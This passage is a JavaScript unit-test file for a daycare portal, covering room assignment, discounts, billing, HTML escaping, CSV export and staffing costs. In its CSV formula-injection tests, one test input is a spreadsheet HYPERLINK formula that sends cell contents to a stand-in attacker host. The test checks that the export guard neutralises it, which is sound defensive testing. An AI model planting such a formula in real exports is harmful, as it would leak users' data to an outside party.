// ============================================================
// BUSINESS LOGIC UNIT TESTS
// Tests for core portal logic: room assignment, discounts,
// registration window, billing (weekly rates, multi-child).
//
// Run: node js/tests/business-logic.test.js
// No npm dependencies — uses only Node.js built-ins.
// ============================================================

'use strict';

// ---- Minimal test runner ----

let _passed = 0, _failed = 0;
function describe(label, fn) { console.log(`\n  ${label}`); fn(); }
function test(label, fn) {
    try {
        fn();
        _passed++;
        console.log(`    ✓ ${label}`);
    } catch (err) {
        _failed++;
        console.error(`    ✗ ${label}\n      ${err.message}`);
    }
}
function expect(actual) {
    return {
        toBe: (expected) => {
            if (actual !== expected)
                throw new Error(`expected ${JSON.stringify(expected)}, got ${JSON.stringify(actual)}`);
        },
        toBeNull: () => {
            if (actual !== null)
                throw new Error(`expected null, got ${JSON.stringify(actual)}`);
        },
        toBeCloseTo: (expected, decimals = 2) => {
            const diff = Math.abs(actual - expected);
            if (diff >= Math.pow(10, -decimals) / 2)
                throw new Error(`expected ~${expected}, got ${actual}`);
        },
        toBeGreaterThan: (n) => {
            if (actual <= n) throw new Error(`expected > ${n}, got ${actual}`);
        },
        toBeLessThan: (n) => {
            if (actual >= n) throw new Error(`expected < ${n}, got ${actual}`);
        },
    };
}

// Date-only values in the application are local civil dates, not UTC instants.
// `new Date('YYYY-MM-DD')` is UTC by specification and becomes the previous day
// in America/Chicago, which made these tests depend on the machine timezone.
function localDate(isoDate) {
    return new Date(`${isoDate}T00:00:00`);
}

// ============================================================
// STUBS — mirror the real ROOMS config from supabase.js
// ============================================================
// `status` mirrors js/supabase.js — getRoomIdFromDob filters on status==='active',
// NOT on room id, so the fixture has to carry it or the room-assignment tests are
// exercising different logic than production.
const ROOMS = [
    { id: 'bear',   status: 'active',   ageMinMonths: 0,  ageMaxMonths: 12,  fullDayRate: 80,  halfDayRate: null, weeklyFullRate: null, weeklyHalfRate: null, fullDayOnly: true },
    { id: 'bee',    status: 'active',   ageMinMonths: 12, ageMaxMonths: 24,  fullDayRate: 75,  halfDayRate: 55,   weeklyFullRate: null, weeklyHalfRate: null, fullDayOnly: false },
    { id: 'turtle', status: 'active',   ageMinMonths: 24, ageMaxMonths: 30,  fullDayRate: 75,  halfDayRate: 45,   weeklyFullRate: null, weeklyHalfRate: null, fullDayOnly: false },
    { id: 'goose',  status: 'active',   ageMinMonths: 30, ageMaxMonths: 36,  fullDayRate: 75,  halfDayRate: 45,   weeklyFullRate: null, weeklyHalfRate: null, fullDayOnly: false },
    { id: 'owl',    status: 'active',   ageMinMonths: 36, ageMaxMonths: null, fullDayRate: 75, halfDayRate: 45,   weeklyFullRate: 300, weeklyHalfRate: 180,  fullDayOnly: false },
    { id: 'summer', status: 'seasonal', ageMinMonths: null, ageMaxMonths: null, fullDayRate: 75, halfDayRate: null, weeklyFullRate: null, weeklyHalfRate: null, hidden: false },
];

// ============================================================
// PURE FUNCTIONS (copied verbatim from app.js / supabase.js)
// These must remain in sync when the source changes.
// ============================================================

function calcAgeMonths(dobStr, referenceDate) {
    if (!dobStr) return null;
    const today = referenceDate || new Date();
    const birth = new Date(dobStr + 'T00:00:00');
    let months = (today.getFullYear() - birth.getFullYear()) * 12
               + (today.getMonth() - birth.getMonth());
    if (today.getDate() < birth.getDate()) months--;
    return months;
}

function roomIdForAgeMonths(months, roomList) {
    if (months == null || months < 0) return null;
    const ageable = (roomList || [])
        .filter(r => r.ageMinMonths != null)
        .sort((a, b) => a.ageMinMonths - b.ageMinMonths);
    for (const room of ageable) {
        if (months >= room.ageMinMonths && (room.ageMaxMonths == null || months < room.ageMaxMonths)) {
            return room.id;
        }
    }
    return null;
}

function getRoomIdFromDob(dobStr, referenceDate) {
    if (!dobStr) return null;
    const months = calcAgeMonths(dobStr, referenceDate);
    return roomIdForAgeMonths(months, ROOMS.filter(r => r.status === 'active'));
}

function effectiveRate(baseRate, discountType, discountValue) {
    if (!baseRate) return 0;
    if (discountType === 'staff') return 0;
    if (discountType === 'custom' && discountValue > 0)
        return Math.round(baseRate * (1 - discountValue / 100) * 100) / 100;
    return baseRate;
}

// centralHour simulates the current hour (0–23) in America/Chicago time.
// Defaults to 12 (noon) so existing tests that don't care about time still pass.
function getRegistrationWindow(today, override = 'auto', centralHour = 12) {
    const day   = today.getDate();
    const year  = today.getFullYear();
    const month = today.getMonth();

    const targetDate  = new Date(year, month + 1, 1);
    const deadlineDate = new Date(year, month, 15);

    const opensToday = (day === 1 && centralHour < 9);
    let mode;
    if (day > 15 || opensToday) {
        mode = 'closed';
    } else {
        mode = 'confirmed';
    }
    if (override === 'open')   mode = 'confirmed';
    if (override === 'closed') mode = 'closed';

    return {
        mode,
        opensToday,
        targetDate,
        targetLabel:  ['January','February','March','April','May','June',
                       'July','August','September','October','November','December'][targetDate.getMonth()]
                      + ' ' + targetDate.getFullYear(),
        deadlineLabel: deadlineDate.toLocaleDateString('en-US', { month: 'long', day: 'numeric' }),
    };
}

function getWeekMonday(dateStr) {
    const d   = new Date(dateStr + 'T00:00:00');
    const dow = d.getDay(); // 0=Sun … 6=Sat
    const toMon = dow === 0 ? -6 : 1 - dow;
    const mon = new Date(d);
    mon.setDate(d.getDate() + toMon);
    return mon.toISOString().slice(0, 10);
}

// Simplified calcTotal for testing (no global state — takes args instead)
function calcTotalForTest(selectedDatesMap, children) {
    if (!children.length) return 0;

    const byWeek = new Map();
    for (const [dateStr, entry] of selectedDatesMap) {
        const wk = getWeekMonday(dateStr);
        if (!byWeek.has(wk)) byWeek.set(wk, []);
        byWeek.get(wk).push({ dateStr, dayType: entry.dayType });
    }

    let total = 0;
    for (const [, days] of byWeek) {
        const isFullWeek = days.length === 5;
        const allFull    = isFullWeek && days.every(d => d.dayType === 'full');
        const allHalf    = isFullWeek && days.every(d => d.dayType === 'half');

        if (allFull || allHalf) {
            // Weekly rate per child
            for (const child of children) {
                const weeklyRate = allFull ? child.room.weeklyFullRate : child.room.weeklyHalfRate;
                if (weeklyRate) {
                    total += effectiveRate(weeklyRate, child.discountType, child.discountValue);
                } else {
                    // No weekly rate configured — sum individual days
                    const dailyRate = allFull ? child.room.fullDayRate : (child.room.halfDayRate || 0);
                    total += 5 * effectiveRate(dailyRate, child.discountType, child.discountValue);
                }
            }
        } else {
            for (const day of days) {
                const sorted = children.map(c => {
                    const base = day.dayType === 'half' ? (c.room.halfDayRate || 0) : (c.room.fullDayRate || 0);
                    return { child: c, eff: effectiveRate(base, c.discountType, c.discountValue) };
                }).sort((a, b) => b.eff - a.eff);

                sorted.forEach((entry, i) => {
                    total += Math.max(0, entry.eff - (i > 0 ? 10 : 0));
                });
            }
        }
    }
    return total;
}

function escHtml(str) {
    return String(str ?? '')
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#39;');
}

// ============================================================
// TESTS
// ============================================================

describe('calcAgeMonths', () => {
    const ref = localDate('2026-03-24');

    test('returns correct month count for a 6-month-old', () => {
        expect(calcAgeMonths('2025-09-24', ref)).toBe(6);
    });
    test('returns 0 for a child born today', () => {
        expect(calcAgeMonths('2026-03-24', ref)).toBe(0);
    });
    test('returns 36 for a 3-year-old', () => {
        expect(calcAgeMonths('2023-03-24', ref)).toBe(36);
    });
    test('returns null for empty string', () => {
        expect(calcAgeMonths('')).toBeNull();
    });
    test('handles month-boundary crossings (e.g., born Oct 31, ref Mar 1)', () => {
        const r = localDate('2026-03-01');
        // Oct→Nov→Dec→Jan→Feb→Mar = 5 calendar months, but the 1st is still
        // 30 days short of the 31st-of-the-month mark, so only 4 are complete.
        expect(calcAgeMonths('2025-10-31', r)).toBe(4);
    });
    test('does not round up early when the day-of-month has not been reached yet', () => {
        // Born Mar 28, 2025; as of Mar 24, 2026 they are 11 months old, not 12 —
        // their 12-month "birthday" is 4 days away. A year/month-only diff
        // (ignoring day-of-month) would wrongly report 12 here.
        expect(calcAgeMonths('2025-03-28', localDate('2026-03-24'))).toBe(11);
    });
});

describe('getRoomIdFromDob — age-based room assignment', () => {
    const ref = localDate('2026-03-24');
    // Helper: produce DOB that gives exactly N months of age on ref date
    const dobAtMonths = m => {
        const d = new Date(ref);
        d.setMonth(d.getMonth() - m);
        return `${d.getFullYear()}-${String(d.getMonth() + 1).padStart(2, '0')}-${String(d.getDate()).padStart(2, '0')}`;
    };

    test('newborn (0 months) → bear room', () => {
        expect(getRoomIdFromDob(dobAtMonths(0), ref)).toBe('bear');
    });
    test('11 months → bear room (upper boundary)', () => {
        expect(getRoomIdFromDob(dobAtMonths(11), ref)).toBe('bear');
    });
    test('12 months → bee room', () => {
        expect(getRoomIdFromDob(dobAtMonths(12), ref)).toBe('bee');
    });
    test('23 months → bee room (upper boundary)', () => {
        expect(getRoomIdFromDob(dobAtMonths(23), ref)).toBe('bee');
    });
    test('24 months → turtle room', () => {
        expect(getRoomIdFromDob(dobAtMonths(24), ref)).toBe('turtle');
    });
    test('29 months → turtle room (upper boundary)', () => {
        expect(getRoomIdFromDob(dobAtMonths(29), ref)).toBe('turtle');
    });
    test('30 months → goose room', () => {
        expect(getRoomIdFromDob(dobAtMonths(30), ref)).toBe('goose');
    });
    test('35 months → goose room (upper boundary)', () => {
        expect(getRoomIdFromDob(dobAtMonths(35), ref)).toBe('goose');
    });
    test('36 months → owl room', () => {
        expect(getRoomIdFromDob(dobAtMonths(36), ref)).toBe('owl');
    });
    test('60 months (5 yrs) → owl room (no upper bound)', () => {
        expect(getRoomIdFromDob(dobAtMonths(60), ref)).toBe('owl');
    });
    test('future DOB (negative age) → null', () => {
        expect(getRoomIdFromDob('2030-01-01', ref)).toBeNull();
    });
    test('a few days shy of the 12-month mark stays in bear, not bee', () => {
        // Turns 12 months on Mar 28, 2026 — still bear as of Mar 24.
        expect(getRoomIdFromDob('2025-03-28', ref)).toBe('bear');
    });
    test('null/empty DOB → null', () => {
        expect(getRoomIdFromDob(null)).toBeNull();
        expect(getRoomIdFromDob('')).toBeNull();
    });
});

describe('effectiveRate — discount calculation', () => {
    test('no discount returns base rate unchanged', () => {
        expect(effectiveRate(75, 'none', 0)).toBe(75);
    });
    test('staff discount → 0', () => {
        expect(effectiveRate(75, 'staff', 0)).toBe(0);
    });
    test('custom 20% off $75 → $60', () => {
        expect(effectiveRate(75, 'custom', 20)).toBe(60);
    });
    test('custom 10% off $55 → $49.50', () => {
        expect(effectiveRate(55, 'custom', 10)).toBeCloseTo(49.5);
    });
    test('custom 0% → base rate unchanged', () => {
        expect(effectiveRate(75, 'custom', 0)).toBe(75);
    });
    test('zero base rate → 0 regardless of discount type', () => {
        expect(effectiveRate(0, 'none', 0)).toBe(0);
        expect(effectiveRate(0, 'custom', 50)).toBe(0);
    });
    test('result is rounded to 2 decimal places', () => {
        // 75 * (1 - 33/100) = 75 * 0.67 = 50.25
        expect(effectiveRate(75, 'custom', 33)).toBe(50.25);
    });
});

describe('getRegistrationWindow — registration open/close logic', () => {
    test('day 1 at 9 AM → open (mode: confirmed)', () => {
        expect(getRegistrationWindow(localDate('2026-03-01'), 'auto', 9).mode).toBe('confirmed');
    });
    test('day 1 at 8:59 AM → closed (before 9 AM)', () => {
        expect(getRegistrationWindow(localDate('2026-03-01'), 'auto', 8).mode).toBe('closed');
    });
    test('day 1 at midnight → closed (before 9 AM)', () => {
        expect(getRegistrationWindow(localDate('2026-03-01'), 'auto', 0).mode).toBe('closed');
    });
    test('day 15 → open (boundary)', () => {
        expect(getRegistrationWindow(localDate('2026-03-15')).mode).toBe('confirmed');
    });
    test('day 16 → closed', () => {
        expect(getRegistrationWindow(localDate('2026-03-16')).mode).toBe('closed');
    });
    test('day 31 → closed', () => {
        expect(getRegistrationWindow(localDate('2026-01-31')).mode).toBe('closed');
    });
    test('override "open" forces mode to confirmed even after day 15', () => {
        expect(getRegistrationWindow(localDate('2026-03-20'), 'open').mode).toBe('confirmed');
    });
    test('override "open" forces mode to confirmed even before 9 AM on the 1st', () => {
        expect(getRegistrationWindow(localDate('2026-03-01'), 'open', 7).mode).toBe('confirmed');
    });
    test('override "closed" forces mode to closed even on day 1 at 9 AM', () => {
        expect(getRegistrationWindow(localDate('2026-03-01'), 'closed', 9).mode).toBe('closed');
    });
    test('target month is always next calendar month', () => {
        const win = getRegistrationWindow(localDate('2026-03-10'));
        expect(win.targetDate.getMonth()).toBe(3);  // April (0-indexed)
        expect(win.targetDate.getFullYear()).toBe(2026);
    });
    test('target month wraps to January next year in December', () => {
        const win = getRegistrationWindow(localDate('2026-12-10'));
        expect(win.targetDate.getMonth()).toBe(0);  // January
        expect(win.targetDate.getFullYear()).toBe(2027);
    });
});

describe('getWeekMonday — ISO Monday of a week', () => {
    test('Wednesday → Monday of same week', () => {
        expect(getWeekMonday('2026-03-25')).toBe('2026-03-23'); // Wed → Mon
    });
    test('Monday → itself', () => {
        expect(getWeekMonday('2026-03-23')).toBe('2026-03-23');
    });
    test('Sunday → previous Monday', () => {
        expect(getWeekMonday('2026-03-22')).toBe('2026-03-16');
    });
    test('Friday → Monday of same week', () => {
        expect(getWeekMonday('2026-03-27')).toBe('2026-03-23');
    });
    test('crosses month boundary correctly', () => {
        expect(getWeekMonday('2026-04-01')).toBe('2026-03-30'); // Wed Apr 1 → Mon Mar 30
    });
});

describe('calcTotalForTest — billing totals', () => {
    const owlRoom = ROOMS.find(r => r.id === 'owl');   // has weeklyFullRate: 300
    const beeRoom = ROOMS.find(r => r.id === 'bee');   // no weekly rate

    const noDisc = { discountType: 'none', discountValue: 0 };
    const child1 = { room: owlRoom, ...noDisc };

    test('single child, single full day → full day rate', () => {
        const dates = new Map([['2026-03-23', { dayType: 'full' }]]);
        expect(calcTotalForTest(dates, [child1])).toBe(75);
    });
    test('single child, single half day → half day rate', () => {
        const dates = new Map([['2026-03-23', { dayType: 'half' }]]);
        expect(calcTotalForTest(dates, [child1])).toBe(45);
    });
    test('full week Mon–Fri, owl room (weeklyFullRate=300) → 300', () => {
        const dates = new Map([
            ['2026-03-23', { dayType: 'full' }],
            ['2026-03-24', { dayType: 'full' }],
            ['2026-03-25', { dayType: 'full' }],
            ['2026-03-26', { dayType: 'full' }],
            ['2026-03-27', { dayType: 'full' }],
        ]);
        expect(calcTotalForTest(dates, [child1])).toBe(300);
    });
    test('4 days (not a full week) → 4 × daily rate', () => {
        const dates = new Map([
            ['2026-03-23', { dayType: 'full' }],
            ['2026-03-24', { dayType: 'full' }],
            ['2026-03-25', { dayType: 'full' }],
            ['2026-03-26', { dayType: 'full' }],
        ]);
        expect(calcTotalForTest(dates, [child1])).toBe(4 * 75);
    });
    test('full week, bee room (no weekly rate) → 5 × daily rate', () => {
        const beeChild = { room: beeRoom, ...noDisc };
        const dates = new Map([
            ['2026-03-23', { dayType: 'full' }],
            ['2026-03-24', { dayType: 'full' }],
            ['2026-03-25', { dayType: 'full' }],
            ['2026-03-26', { dayType: 'full' }],
            ['2026-03-27', { dayType: 'full' }],
        ]);
        expect(calcTotalForTest(dates, [beeChild])).toBe(5 * 75);
    });
    test('two children, 1 day: second child gets $10 multi-child discount', () => {
        const child2 = { room: owlRoom, ...noDisc };
        const dates = new Map([['2026-03-23', { dayType: 'full' }]]);
        // child1: $75, child2: $75 - $10 = $65 → total $140
        expect(calcTotalForTest(dates, [child1, child2])).toBe(140);
    });
    test('staff discount child → $0 regardless of day type', () => {
        const staffChild = { room: owlRoom, discountType: 'staff', discountValue: 0 };
        const dates = new Map([['2026-03-23', { dayType: 'full' }]]);
        expect(calcTotalForTest(dates, [staffChild])).toBe(0);
    });
    test('custom 20% discount applied to daily rate', () => {
        const discChild = { room: owlRoom, discountType: 'custom', discountValue: 20 };
        // $75 * 0.80 = $60
        const dates = new Map([['2026-03-23', { dayType: 'full' }]]);
        expect(calcTotalForTest(dates, [discChild])).toBe(60);
    });
    test('empty dates → 0', () => {
        expect(calcTotalForTest(new Map(), [child1])).toBe(0);
    });
    test('no children → 0', () => {
        const dates = new Map([['2026-03-23', { dayType: 'full' }]]);
        expect(calcTotalForTest(dates, [])).toBe(0);
    });
});

describe('escHtml — XSS sanitization', () => {
    test('escapes < and >', () => {
        expect(escHtml('<script>')).toBe('&lt;script&gt;');
    });
    test('escapes &', () => {
        expect(escHtml('A & B')).toBe('A &amp; B');
    });
    test('escapes double quotes', () => {
        expect(escHtml('"quoted"')).toBe('&quot;quoted&quot;');
    });
    test('escapes single quotes', () => {
        expect(escHtml("it's")).toBe('it&#39;s');
    });
    test('plain text unchanged', () => {
        expect(escHtml('Alice Smith')).toBe('Alice Smith');
    });
    test('null/undefined → empty string', () => {
        expect(escHtml(null)).toBe('');
        expect(escHtml(undefined)).toBe('');
    });
    test('number converted to string', () => {
        expect(escHtml(42)).toBe('42');
    });
});

// ---- csvCell (copy of js/admin/admin-core.js) ----
function csvCell(val) {
    let str = String(val ?? '');
    if (/^[=+\-@\t\r]/.test(str)) str = `'${str}`;
    return str.includes(',') || str.includes('"') || str.includes('\n')
        ? `"${str.replace(/"/g, '""')}"` : str;
}

describe('csvCell — RFC 4180 quoting + formula-injection guard', () => {
    test('plain text passes through', () => {
        expect(csvCell('Alice Smith')).toBe('Alice Smith');
    });
    test('comma forces quoting', () => {
        expect(csvCell('Smith, Alice')).toBe('"Smith, Alice"');
    });
    test('embedded quote is doubled', () => {
        expect(csvCell('the "Bear" room')).toBe('"the ""Bear"" room"');
    });
    test('newline forces quoting', () => {
        expect(csvCell('line1\nline2')).toBe('"line1\nline2"');
    });
    test('null/undefined → empty string', () => {
        expect(csvCell(null)).toBe('');
        expect(csvCell(undefined)).toBe('');
    });
    test('number is stringified', () => {
        expect(csvCell(42)).toBe('42');
    });

    // R17 — a parent-supplied name starting with =, +, - or @ executes when the
    // export is opened in Excel/Sheets. The apostrophe forces text, and is not
    // displayed by the spreadsheet.
    test('leading = is neutralised', () => {
        expect(csvCell('=HYPERLINK("http://evil.tld?"&A1)'))
            .toBe('"\'=HYPERLINK(""http://evil.tld?""&A1)"');
    });
    test('leading + is neutralised', () => {
        expect(csvCell('+1234')).toBe("'+1234");
    });
    test('leading - is neutralised', () => {
        expect(csvCell('-1+1')).toBe("'-1+1");
    });
    test('leading @ is neutralised', () => {
        expect(csvCell('@SUM(A1:A9)')).toBe("'@SUM(A1:A9)");
    });
    test('a hyphen mid-string is left alone', () => {
        expect(csvCell('Mary-Jane')).toBe('Mary-Jane');
    });
    test('phone number keeps its leading plus escaped, still one field', () => {
        expect(csvCell('+1 (314) 555-0100')).toBe("'+1 (314) 555-0100");
    });
});

// ============================================================
// SOURCE-DRIFT GUARD
// ------------------------------------------------------------
// The functions above are copies of production code, because js/*.js are plain
// browser globals with top-level side effects and cannot be require()d from
// Node. That makes every test above vacuous on its own: change effectiveRate()
// in js/app.js and all of these still pass.
//
// This guard closes that gap. It reads the real source, extracts the named
// function by brace-matching, normalizes whitespace/comments, and compares it to
// the copy in this file. If production changes and the copy is not re-synced,
// the suite goes red and names the function.
//
// It is not a substitute for importing the real code — the proper fix is to
// extract these pure functions into a side-effect-free module both the browser
// and Node can load — but it does mean divergence can no longer happen silently.
// (It caught a real one: getRoomIdFromDob had already been refactored in
// supabase.js to filter on status==='active' while this file still filtered on
// id !== 'summer'.)
// ============================================================
const fs   = require('fs');
const path = require('path');

function extractFunction(sourceText, name) {
    const start = sourceText.search(new RegExp(`^function\\s+${name}\\s*\\(`, 'm'));
    if (start === -1) return null;
    const open = sourceText.indexOf('{', start);
    let depth = 0, i = open;
    for (; i < sourceText.length; i++) {
        const c = sourceText[i];
        if (c === '{') depth++;
        else if (c === '}') { depth--; if (depth === 0) { i++; break; } }
    }
    return sourceText.slice(start, i);
}

// Strip comments and collapse whitespace so formatting-only edits don't trip it.
function normalize(fnText) {
    return fnText
        .replace(/\/\*[\s\S]*?\*\//g, '')
        .replace(/\/\/[^\n]*/g, '')
        .replace(/\s+/g, ' ')
        .trim();
}

// ── Ratio-step / next-child calculator (copied from js/admin/admin-reports.js) ──
// The day is two shifts: AM holds every child booked, PM holds only the
// full-day children (a half-day booking is a morning session). Staffing steps
// per shift, so the child who trips a shift pays for that shift's teacher.
const SHIFT_HRS = { am: 5, pm: 5 };
let allRegistrations = [];

function _ratioStepWage(staff, roomId) {
    const hourly = staff.filter(s => s.pay_type === 'hourly' && Number(s.hourly_rate) > 0);
    const inRoom = hourly.filter(s => s.room_id === roomId);
    const pool   = inRoom.length ? inRoom : hourly;
    if (!pool.length) return 0;
    return pool.reduce((sum, s) => sum + Number(s.hourly_rate), 0) / pool.length;
}

function _ratioStaffNeed(children, ratio) {
    if (!ratio || ratio <= 0) return null;
    return Math.ceil(children / ratio);
}

function _ratioStepOffer(opts) {
    const { isFullDay, rate, ratio, wage, openSeats, headroomAm, headroomPm, amChildren } = opts;
    const none = { stepsAm: false, stepsPm: false, cost: null, margin: null };

    if (!rate || rate <= 0)                        return Object.assign({ verdict: 'not-offered' }, none);
    if (openSeats !== null && openSeats <= 0)      return Object.assign({ verdict: 'full' }, none);
    if (!ratio || ratio <= 0)                      return Object.assign({ verdict: 'no-ratio' }, none);

    // The morning must absorb every booking; only a full day also has to fit
    // the afternoon.
    const stepsAm = headroomAm === 0;
    const stepsPm = isFullDay && headroomPm === 0;

    if (!stepsAm && !stepsPm) {
        return { verdict: 'free', stepsAm, stepsPm, cost: 0, margin: rate };
    }
    // A room with nobody booked needs its first teacher for this child.
    const verdict = amChildren === 0 ? 'opens' : 'step';
    if (!wage || wage <= 0) {
        return { verdict, stepsAm, stepsPm, cost: null, margin: null };
    }
    const cost = (stepsAm ? SHIFT_HRS.am : 0) * wage + (stepsPm ? SHIFT_HRS.pm : 0) * wage;
    return { verdict, stepsAm, stepsPm, cost, margin: rate - cost };
}

function _buildRatioStepRows(weekDates, rooms, staff) {
    const counts = {};                       // date → roomId → { total, half }
    weekDates.forEach(d => { counts[d] = {}; });

    allRegistrations.forEach(reg => {
        if (reg.status !== 'confirmed') return;
        (reg.registration_dates || []).forEach(rd => {
            if (rd.waitlisted || !counts[rd.care_date]) return;
            const roomId = rd.room_id || reg.room_id;
            if (!roomId) return;
            const c = counts[rd.care_date][roomId] ||
                      (counts[rd.care_date][roomId] = { total: 0, half: 0 });
            c.total++;
            if (rd.day_type === 'half') c.half++;
        });
    });

    const wageByRoom = {};
    rooms.forEach(r => { wageByRoom[r.id] = _ratioStepWage(staff, r.id); });

    const rows = [];
    weekDates.forEach(date => {
        rooms.forEach(room => {
            const c        = counts[date][room.id] || { total: 0, half: 0 };
            const ratio    = room.staffRatio || 0;
            const capacity = room.capacity   || 0;
            const wage     = wageByRoom[room.id] || 0;
            const fullRate = room.fullDayRate || 0;
            // A full-day-only room has no half-day booking to price.
            const halfRate = room.fullDayOnly ? 0 : (room.halfDayRate || 0);

            // Morning holds everyone; the afternoon holds only full-day children.
            const amChildren = c.total;
            const pmChildren = c.total - c.half;

            // ceil() is the step. With 0 children 0 teachers are required, so
            // the first child of a shift genuinely does cost a teacher — that
            // is a real step, not an edge case to paper over.
            const staffAm    = _ratioStaffNeed(amChildren, ratio);
            const staffPm    = _ratioStaffNeed(pmChildren, ratio);
            const headroomAm = ratio > 0 ? staffAm * ratio - amChildren : null;
            const headroomPm = ratio > 0 ? staffPm * ratio - pmChildren : null;
            const openSeats  = capacity > 0 ? capacity - amChildren : null;

            // Teachers the afternoon does not need — they can leave at midday
            // once the half-day children go home.
            const releasable      = (staffAm === null || staffPm === null) ? null : staffAm - staffPm;
            const releasableHours = releasable === null ? null : releasable * SHIFT_HRS.pm;

            const shared = { ratio, wage, openSeats, headroomAm, headroomPm, amChildren };
            const fullDay = _ratioStepOffer(Object.assign({ isFullDay: true,  rate: fullRate }, shared));
            const halfDay = _ratioStepOffer(Object.assign({ isFullDay: false, rate: halfRate }, shared));

            rows.push({
                date, roomId: room.id, roomLabel: room.label,
                children: c.total, half: c.half, amChildren, pmChildren,
                ratio, capacity, openSeats,
                staffAm, staffPm, headroomAm, headroomPm,
                releasable, releasableHours,
                fullRate, halfRate, wage,
                fullDay, halfDay,
            });
        });
    });
    return rows;
}

// Test helpers
function _rsRoom(over = {}) {
    return Object.assign({ id: 'a', label: 'A', staffRatio: 4, capacity: 20,
                           fullDayRate: 75, halfDayRate: 45, fullDayOnly: false }, over);
}
function _rsRun(rooms, staff, bookings, dates = ['2026-08-11']) {
    allRegistrations = bookings.map(b => ({
        status: b.status || 'confirmed',
        room_id: b.room || 'a',
        registration_dates: [{
            care_date: b.date || '2026-08-11',
            room_id: b.room || 'a',
            day_type: b.t || 'full',
            waitlisted: !!b.wl,
        }],
    }));
    return _buildRatioStepRows(dates, rooms, staff);
}
const _RS_WAGE = [{ pay_type: 'hourly', hourly_rate: 20, room_id: null }];
// n children: `half` of them half-day (morning only), the rest full-day.
const _rsFill = (n, half = 0, room = 'a') =>
    Array.from({ length: n }, (_, i) => ({ room, t: i < half ? 'half' : 'full' }));

describe('_ratioStepWage — pricing one more teacher-shift', () => {
    test('averages the hourly staff assigned to the room', () => {
        expect(_ratioStepWage([
            { pay_type: 'hourly', hourly_rate: 16, room_id: 'a' },
            { pay_type: 'hourly', hourly_rate: 20, room_id: 'a' },
        ], 'a')).toBe(18);
    });
    test('falls back to the center-wide average when the room has nobody', () => {
        expect(_ratioStepWage([
            { pay_type: 'hourly', hourly_rate: 10, room_id: 'b' },
            { pay_type: 'hourly', hourly_rate: 30, room_id: 'c' },
        ], 'a')).toBe(20);
    });
    test('room-assigned staff take precedence over the center average', () => {
        expect(_ratioStepWage([
            { pay_type: 'hourly', hourly_rate: 50, room_id: 'a' },
            { pay_type: 'hourly', hourly_rate: 10, room_id: 'b' },
        ], 'a')).toBe(50);
    });
    test('salaried staff are excluded — a salary does not change with a child', () => {
        expect(_ratioStepWage([{ pay_type: 'salary', salary_biweekly: 2000, room_id: 'a' }], 'a')).toBe(0);
    });
    test('zero and missing rates are ignored rather than averaged in', () => {
        expect(_ratioStepWage([
            { pay_type: 'hourly', hourly_rate: 0,  room_id: 'a' },
            { pay_type: 'hourly', hourly_rate: 20, room_id: 'a' },
        ], 'a')).toBe(20);
    });
    test('no wage data at all returns 0 (callers must treat as unknown)', () => {
        expect(_ratioStepWage([], 'a')).toBe(0);
    });
});

describe('_ratioStaffNeed — teachers a shift requires', () => {
    test('rounds up to the next whole teacher', () => {
        expect(_ratioStaffNeed(9, 4)).toBe(3);
    });
    test('an exact multiple needs no extra teacher', () => {
        expect(_ratioStaffNeed(8, 4)).toBe(2);
    });
    test('an empty shift needs nobody', () => {
        expect(_ratioStaffNeed(0, 4)).toBe(0);
    });
    test('an unset ratio is unknown, not zero', () => {
        expect(_ratioStaffNeed(9, 0)).toBeNull();
    });
});

describe('_ratioStepOffer — what one more booking is worth', () => {
    const base = { rate: 75, ratio: 4, wage: 20, openSeats: 5,
                   headroomAm: 2, headroomPm: 2, amChildren: 6 };
    const offer = over => _ratioStepOffer(Object.assign({ isFullDay: true }, base, over));

    test('room with headroom on both shifts takes the child free', () => {
        const o = offer({});
        expect(o.verdict).toBe('free');
        expect(o.cost).toBe(0);
        expect(o.margin).toBe(75);
    });
    test('tripping only the morning costs one morning shift', () => {
        const o = offer({ headroomAm: 0 });
        expect(o.stepsAm).toBe(true);
        expect(o.stepsPm).toBe(false);
        expect(o.cost).toBe(100);            // 5 h x 20
        expect(o.margin).toBe(-25);
    });
    test('tripping only the afternoon costs one afternoon shift', () => {
        const o = offer({ headroomPm: 0 });
        expect(o.stepsAm).toBe(false);
        expect(o.stepsPm).toBe(true);
        expect(o.cost).toBe(100);
    });
    test('tripping both shifts costs a teacher all day', () => {
        const o = offer({ headroomAm: 0, headroomPm: 0 });
        expect(o.cost).toBe(200);            // 10 h x 20
        expect(o.margin).toBe(-125);
    });
    test('a half day never trips the afternoon — it has already gone home', () => {
        const o = _ratioStepOffer(Object.assign({}, base,
            { isFullDay: false, rate: 45, headroomPm: 0 }));
        expect(o.stepsPm).toBe(false);
        expect(o.verdict).toBe('free');
        expect(o.margin).toBe(45);
    });
    test('a half day still trips the morning it shares', () => {
        const o = _ratioStepOffer(Object.assign({}, base,
            { isFullDay: false, rate: 45, headroomAm: 0 }));
        expect(o.stepsAm).toBe(true);
        expect(o.cost).toBe(100);
        expect(o.margin).toBe(-55);
    });
    test('no seat outranks any ratio headroom', () => {
        expect(offer({ openSeats: 0 }).verdict).toBe('full');
        expect(offer({ openSeats: -1 }).verdict).toBe('full');
    });
    test('an unset ratio is reported, never guessed', () => {
        const o = offer({ ratio: 0 });
        expect(o.verdict).toBe('no-ratio');
        expect(o.margin).toBeNull();
    });
    test('a rate of zero means the booking type is not offered', () => {
        expect(offer({ rate: 0 }).verdict).toBe('not-offered');
    });
    test('unknown wage yields a null margin, never a free teacher', () => {
        const o = offer({ headroomAm: 0, wage: 0 });
        expect(o.verdict).toBe('step');
        expect(o.cost).toBeNull();
        expect(o.margin).toBeNull();
    });
    test('an empty room reports opening it rather than a plain step', () => {
        expect(offer({ headroomAm: 0, headroomPm: 0, amChildren: 0 }).verdict).toBe('opens');
    });
});

describe('_buildRatioStepRows — AM/PM shift split', () => {
    test('the afternoon drops the half-day children', () => {
        const r = _rsRun([_rsRoom()], _RS_WAGE, _rsFill(10, 7))[0];
        expect(r.amChildren).toBe(10);
        expect(r.pmChildren).toBe(3);
        expect(r.half).toBe(7);
    });
    test('each shift is staffed to its own occupancy', () => {
        const r = _rsRun([_rsRoom()], _RS_WAGE, _rsFill(10, 7))[0];
        expect(r.staffAm).toBe(3);           // ceil(10/4)
        expect(r.staffPm).toBe(1);           // ceil(3/4)
    });
    test('teachers the afternoon does not need are counted as releasable', () => {
        const r = _rsRun([_rsRoom()], _RS_WAGE, _rsFill(10, 7))[0];
        expect(r.releasable).toBe(2);
